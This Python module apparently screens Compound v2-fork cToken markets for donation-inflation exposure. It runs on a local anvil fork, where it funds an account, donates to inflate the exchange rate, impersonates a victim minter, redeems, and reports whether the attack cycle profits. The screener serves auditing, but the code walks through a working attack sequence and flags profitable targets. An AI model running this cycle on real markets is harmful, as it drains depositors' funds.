"""cToken (Compound v2 fork) donation-inflation screening on a live fork."""

from __future__ import annotations

from typing import TYPE_CHECKING

import httpx

from ruin.core.screens import CtokenScreen
from ruin.services.balances import find_balance_slot
from ruin.services.fork import fork
from ruin.services.rpc import SHARED_TRANSPORT, jsonrpc
from ruin.services.subprocesses import (
    ANVIL_DEV_ADDRESS,
    DEFAULT_PRIVATE_KEY,
    cast_call_command,
    cast_send_command,
    parse_cast_int,
    run_command,
)

if TYPE_CHECKING:
    import subprocess

CTOKEN_PORT = 19672
_CASH_SIG = "getCash()(uint256)"
_RATE_SIG = "exchangeRateStored()(uint256)"
_UNDERLYING_SIG = "underlying()(address)"
_VICTIM = "0x0000000000000000000000000000000000000bee"
_SEED_DIV = 100
_DONATE_DIV = 100
_VICTIM_DIV = 20
_MIN_BUMP_PCT = 0.5
_EMPTY_HEX_LEN = 2


def _send(
    endpoint: str, target: str, sig: str, args: list[str]
) -> subprocess.CompletedProcess[str]:
    """Broadcast a signed cast send with the default anvil key."""
    return run_command(
        cast_send_command(endpoint, target, sig, args, DEFAULT_PRIVATE_KEY),
        timeout=20.0,
    )


def _call(
    endpoint: str, target: str, sig: str, args: list[str]
) -> subprocess.CompletedProcess[str]:
    """Static-call a contract method and return the raw result process."""
    return run_command(cast_call_command(endpoint, target, sig, args), timeout=20.0)


def _balance(endpoint: str, asset: str, wallet: str) -> int:
    """Read an ERC20 balance as an integer."""
    return parse_cast_int(_call(endpoint, asset, "balanceOf(address)", [wallet]).stdout)


def _fund(endpoint: str, asset: str, wallet: str, amount: int) -> bool:
    """Credit ``wallet`` with ``amount`` of ``asset`` via the balance slot."""
    base, key = find_balance_slot(endpoint, asset, wallet)
    if base < 0:
        return False
    jsonrpc(
        SHARED_TRANSPORT,
        endpoint,
        "anvil_setStorageAt",
        [asset, key, f"0x{amount:064x}"],
    )
    return True


def _rate(endpoint: str, ctoken: str) -> tuple[int, bool]:
    """Read the stored exchange rate; return (value, read-ok)."""
    out = run_command(cast_call_command(endpoint, ctoken, _RATE_SIG, []), timeout=20.0)
    ok = out.returncode == 0
    return (parse_cast_int(out.stdout) if ok else 0), ok


def _donate(endpoint: str, ctoken: str, asset: str, cash: int) -> None:
    """Send 1% of market cash to the cToken as a pure donation."""
    _send(
        endpoint,
        asset,
        "transfer(address,uint256)",
        [ctoken, str(max(cash // _DONATE_DIV, 1))],
    )


def _seed_mint(endpoint: str, ctoken: str, asset: str, cash: int) -> None:
    """Approve and mint 1% of cash from the dev account (seed position)."""
    _send(endpoint, asset, "approve(address,uint256)", [ctoken, str(cash)])
    _send(endpoint, ctoken, "mint(uint256)", [str(max(cash // _SEED_DIV, 1))])


def _redeem_all(endpoint: str, ctoken: str) -> None:
    """Redeem every dev share in two slices (redeemAll guards may block all)."""
    first = _balance(endpoint, ctoken, ANVIL_DEV_ADDRESS)
    _send(endpoint, ctoken, "redeem(uint256)", [str(first // 2 + 1)])
    rest = _balance(endpoint, ctoken, ANVIL_DEV_ADDRESS)
    _send(endpoint, ctoken, "redeem(uint256)", [str(rest)])


def _exposure(endpoint: str, ctoken: str, asset: str, cash: int) -> tuple[float, int]:
    """Fund dev, donate 1% of cash; return (rate bump pct, start balance)."""
    before, ok_before = _rate(endpoint, ctoken)
    _fund(endpoint, asset, ANVIL_DEV_ADDRESS, cash + cash // 10)
    start_raw = _balance(endpoint, asset, ANVIL_DEV_ADDRESS)
    _donate(endpoint, ctoken, asset, cash)
    after, ok_after = _rate(endpoint, ctoken)
    if not ok_before or not ok_after:
        return -1.0, start_raw
    bump = ((after - before) * 100.0 / before) if before > 0 else 0.0
    return bump, start_raw


def _send_unlocked(
    endpoint: str, target: str, sig: str, args: list[str], wallet: str
) -> subprocess.CompletedProcess[str]:
    """Broadcast from an impersonated account (no signing key needed)."""
    return run_command(
        [
            "cast",
            "send",
            target,
            sig,
            *args,
            "--unlocked",
            "--from",
            wallet,
            "--rpc-url",
            endpoint,
        ],
        timeout=20.0,
    )


def _victim_mint(endpoint: str, ctoken: str, asset: str, cash: int) -> None:
    """Impersonate a fresh victim minting 5% of cash post-donation."""
    _fund(endpoint, asset, _VICTIM, cash)
    jsonrpc(SHARED_TRANSPORT, endpoint, "anvil_impersonateAccount", [_VICTIM])
    _send_unlocked(
        endpoint,
        asset,
        "approve(address,uint256)",
        [ctoken, str(cash)],
        _VICTIM,
    )
    _send_unlocked(
        endpoint,
        ctoken,
        "mint(uint256)",
        [str(max(cash // _VICTIM_DIV, 1))],
        _VICTIM,
    )


def _cycle(endpoint: str, ctoken: str, asset: str, cash: int) -> int:
    """Run seed -> donate -> victim-mint -> redeem; return net raw delta."""
    _send(endpoint, asset, "approve(address,uint256)", [ctoken, str(cash)])
    start_raw = _balance(endpoint, asset, ANVIL_DEV_ADDRESS)
    _seed_mint(endpoint, ctoken, asset, cash)
    _donate(endpoint, ctoken, asset, cash)
    _victim_mint(endpoint, ctoken, asset, cash)
    _redeem_all(endpoint, ctoken)
    return _balance(endpoint, asset, ANVIL_DEV_ADDRESS) - start_raw


def ctoken_inflation_data(ctoken: str, rpc: str) -> CtokenScreen:
    """Fork ``rpc`` and screen ``ctoken`` for the donation-inflation class."""
    cm = fork(CTOKEN_PORT, rpc)
    try:
        endpoint = cm.__enter__()
    except (RuntimeError, httpx.HTTPError):
        return _result(ctoken, "fork-unavailable", ["fork-unavailable"])
    try:
        return _screen(endpoint, ctoken, rpc)
    finally:
        cm.__exit__(None, None, None)


def _code_missing(rpc: str, address: str) -> bool:
    """True when the RPC serves empty runtime code for ``address``."""
    code = jsonrpc(SHARED_TRANSPORT, rpc, "eth_getCode", [address, "latest"])
    return isinstance(code, str) and len(code) <= _EMPTY_HEX_LEN


def _result(address: str, verdict: str, signals: list[str]) -> CtokenScreen:
    """Build the standard screen result payload."""
    return CtokenScreen(address=address, verdict=verdict, signals=tuple(signals))


def _market_identity(
    endpoint: str, ctoken: str, rpc_for_code: str
) -> tuple[str, str, str, int]:
    """Resolve (verdict-override, signal, underlying asset, cash)."""
    underlying = run_command(
        cast_call_command(endpoint, ctoken, _UNDERLYING_SIG, []), timeout=20.0
    )
    cash_out = run_command(
        cast_call_command(endpoint, ctoken, _CASH_SIG, []), timeout=20.0
    )
    if underlying.returncode == 0 and cash_out.returncode != 0:
        return "probe-inconclusive", "getCash-read-failed", "", 0
    if underlying.returncode != 0:
        dead = cash_out.returncode != 0 and _code_missing(rpc_for_code, ctoken)
        if dead:
            return "no-code-check-rpc", "rpc-artifact-or-eoa", "", 0
        return "not-ctoken", "", "", 0
    cash = parse_cast_int(cash_out.stdout)
    if cash <= 0:
        return "no-cash", "", "", 0
    asset = f"0x{underlying.stdout.strip().removeprefix('0x')[-40:]}"
    return "", "", asset, cash


def _screen(endpoint: str, ctoken: str, rpc_for_code: str) -> CtokenScreen:
    """Run the cToken exposure + cycle screens against a live fork."""
    override, signal, asset, cash = _market_identity(endpoint, ctoken, rpc_for_code)
    if override:
        signals = [signal] if signal else []
        return _result(ctoken, override, signals)
    bump, _ = _exposure(endpoint, ctoken, asset, cash)
    if bump < 0:
        return _result(ctoken, "probe-inconclusive", ["rate-read-failed"])
    exposed = bump >= _MIN_BUMP_PCT
    net = _cycle(endpoint, ctoken, asset, cash) if exposed else 0
    signals = []
    if exposed:
        signals.append(f"ctoken-rate-exposed:{bump:.2f}%")
        signals.append(
            "ctoken-cycle-profitable" if net > 0 else "ctoken-cycle-negative"
        )
    return CtokenScreen(
        address=ctoken,
        verdict="exposed" if exposed else "clean",
        signals=tuple(signals),
        rate_bump_pct=round(bump, 4),
        cycle_profitable=net > 0,
        cycle_net_raw=net,
    )
